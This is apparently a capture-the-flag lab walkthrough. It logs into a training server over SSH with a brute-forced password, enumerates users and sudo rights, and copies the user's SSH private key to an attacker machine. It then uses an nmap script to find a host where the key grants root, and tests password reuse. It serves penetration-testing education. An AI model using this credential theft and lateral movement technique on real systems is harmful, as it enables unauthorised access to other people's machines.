# Accessing `linux-srv-01`

## Login as `bob`

Login using the brute-forced password `flower`:

```shell-session
kali@kali:~$ ssh bob@10.5.23.11
The authenticity of host '10.5.23.11 (10.5.23.11)' can't be established.
ED25519 key fingerprint is SHA256:ZfgeSHj4SBktQp/rkkKncqfrrqoqIeKxbiw7tMjmPDI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.5.23.11' (ED25519) to the list of known hosts.

[...]

bob@10.5.23.11's password: ****** (flower)

  ###############################################################
  #                                                             #
  # Welcome to                                                  #
  #  _ _                                            ___  _      #
  # | (_)_ __  _   ___  __     ___ _ ____   __     / _ \/ |     #
  # | | | '_ \| | | \ \/ /____/ __| '__\ \ / /____| | | | |     #
  # | | | | | | |_| |>  <_____\__ \ |   \ V /_____| |_| | |     #
  # |_|_|_| |_|\__,_/_/\_\    |___/_|    \_/       \___/|_|     #
  #                                                             #
  ###############################################################
  #                                                             #
  #                 \o/  Happy Hacking  ;-)                     #
  #                                                             #
  ###############################################################

bob@linux-srv-01:~$ hostname
linux-srv-01.nullbyte.internal

bob@linux-srv-01:~$ id
uid=1000(bob) gid=1000(bob) groups=1000(bob)
```

## Flag

Get the flag:

```
bob@linux-srv-01:~$ cat /flag.txt
ssh-labs{bob-has-a-weak-password}
```

## Information Gathering Users

Check the `passwd` DB to see which users are on the system:

```shell-session
bob@linux-srv-01:~$ getent passwd
root:x:0:0:root:/root:/bin/bash
[...]
bob:x:1000:1000::/home/bob:/bin/bash
```

- No other interesting users than `root` and `bob` are on the system.

Check `sudo` permissions (use `flower` as a password again):

```shell-session
bob@linux-srv-01:~$ sudo -l
[sudo] password for bob: ****** (flower)
Sorry, user bob may not run sudo on linux-srv-01.
```

- `bob` has no `sudo` permissions.

Check if the password `flower` is reused for the `root` account:

```shell-session
bob@linux-srv-01:~$ su
Password:
su: Authentication failure
```

- The password `flower` is not accepted

## Information Gathering User `bob`

Checking the `.ssh` directory of `bob`:

```shell-session
bob@linux-srv-01:~$ ls -l .ssh
total 12
-rw------- 1 bob bob 464 May 23 11:37 id_ed25519
-rw------- 1 bob bob  98 May 23 11:37 id_ed25519.pub
```

- There is a public & private key pair.
- There is no `known_hosts` file which could tell to which server this key can be used to perform a login.

### Testing Public Key Acceptance

Go back to your attacker machine:

```shell-session
bob@linux-srv-01:~$ exit
logout
Connection to 10.5.23.11 closed.

kali@kali:~$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),27(sudo)

kali@kali:~$ hostname
kali
```

Copy the public key from `linux-srv-01` to your attacker machine:

```shell-session
kali@kali:~$ scp bob@10.5.23.11:.ssh/id_ed25519.pub .
[...]

bob@10.5.23.11's password: ****** (flower)
id_ed25519.pub                          100%   98    68.2KB/s   00:00
```

Use the nmap script `ssh-publickey-acceptance` to test if the public key is valid for the user `root` or `bob` for any host in the network:

```shell-session
kali@kali:~$ sudo nmap -n -Pn -p 22 --script ssh-publickey-acceptance --script-args 'ssh.usernames={"root", "bob"}, publickeys={"id_ed25519.pub"}' 10.5.23.0/24
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-09 14:59 +0000
NSE: [ssh-publickey-acceptance] Found accepted key: id_ed25519.pub for user root on host 10.5.23.12:22
[...]

Nmap scan report for 10.5.23.12
Host is up (0.000018s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-publickey-acceptance:
|   Accepted Public Keys:
|_    Key id_ed25519.pub accepted for user root
MAC Address: 5A:F0:6F:38:96:1E (Unknown)

Nmap scan report for 10.5.23.13
Host is up (0.000052s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-publickey-acceptance:
|_  Accepted Public Keys: No public keys accepted
MAC Address: DA:49:20:6F:4D:39 (Unknown)

[...]
```

- The public key is accepted by the server `10.5.23.12` for the user `root`.

This can manually be verified.

Trying to connect to `10.5.23.12` as `bob` (use `flower` as a password to test for password reuse):

```shell-session
kali@kali:~$ ssh -v -i id_ed25519.pub bob@10.5.23.12
[...]
The authenticity of host '10.5.23.12 (10.5.23.12)' can't be established.
ED25519 key fingerprint is: SHA256:IxUqu5SO4uOPc4u7ANTSQ2VWh+T22BZPdhDl602bXRY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
[...]

debug1: Will attempt key: id_ed25519.pub ED25519 SHA256:Le+QOc6DFoYa+okebG7jNb2Dx+3lyYLR3loHuksiQ+o explicit
debug1: Offering public key: id_ed25519.pub ED25519 SHA256:Le+QOc6DFoYa+okebG7jNb2Dx+3lyYLR3loHuksiQ+o explicit
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: password
bob@10.5.23.12's password:
debug1: Authentications that can continue: publickey,password
Permission denied, please try again.
bob@10.5.23.12's password: ****** (flower)
^C
```

- The public key `id_ed25519` was offered.
- The public key `id_ed25519` was not accepted.  → This key can therefore not be used to login as `bob`. This is also what the nmap script told us.
- As a next authentication method, password authentication is used.
- Password authentication is supported.
- The password `flower`  is not accepted. So `bob` did not reuse this password on this server.

Trying to connect to `10.5.23.12` as `root`:

```shell-session
kali@kali:~$ ssh -v -i id_ed25519.pub root@10.5.23.12
[...]
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Will attempt key: id_ed25519.pub ED25519 SHA256:Le+QOc6DFoYa+okebG7jNb2Dx+3lyYLR3loHuksiQ+o explicit
debug1: Offering public key: id_ed25519.pub ED25519 SHA256:Le+QOc6DFoYa+okebG7jNb2Dx+3lyYLR3loHuksiQ+o explicit
debug1: Server accepts key: id_ed25519.pub ED25519 SHA256:Le+QOc6DFoYa+okebG7jNb2Dx+3lyYLR3loHuksiQ+o explicit
Load key "id_ed25519.pub": error in libcrypto
debug1: Next authentication method: password
root@10.5.23.12's password: 
[...]
```

- The public key `id_ed25519` was offered.
- The public key `id_ed25519` was accepted.  → This key can therefore be used to login as `root`. This is also what the nmap script told us.
- An error `libcrypto`  is shown because the private key is not accessible on the `kali` machine.
- Password authentication is supported.
- The password `flower`  is not accepted. So `root` did not reuse the password of `bob` on this server.

Copy the private key to the attacker machine:

```shell-session
kali@kali:~$ scp bob@10.5.23.11:.ssh/id_ed25519 .
[...]

bob@10.5.23.11's password:
id_ed25519                              100%  464   279.8KB/s   00:00
```

Try to login as `root` on `10.5.23.12` (use `flower` as a password to test for password reuse):

```
kali@kali:~$ ssh -v -i id_ed25519 root@10.5.23.12
[...]
debug1: Will attempt key: id_ed25519 ED25519 SHA256:Le+QOc6DFoYa+okebG7jNb2Dx+3lyYLR3loHuksiQ+o explicit
debug1: Offering public key: id_ed25519 ED25519 SHA256:Le+QOc6DFoYa+okebG7jNb2Dx+3lyYLR3loHuksiQ+o explicit
debug1: Server accepts key: id_ed25519 ED25519 SHA256:Le+QOc6DFoYa+okebG7jNb2Dx+3lyYLR3loHuksiQ+o explicit
Enter passphrase for key 'id_ed25519': ****** (flower)
Enter passphrase for key 'id_ed25519':
^C
```

- SSH sees that the public key is valid and tries to open the private key.
- The private key is encrypted with a passphrase.
- The password `flower`  was not accepted. The password was not reused for this key.

This can also be verified by using `ssh-keygen`:

```shell-session
kali@kali:~$ ssh-keygen -y -f id_ed25519
Enter passphrase for "id_ed25519":
Load key "id_ed25519": incorrect passphrase supplied to decrypt private key
```

- The password `flower` is not reused on this private key.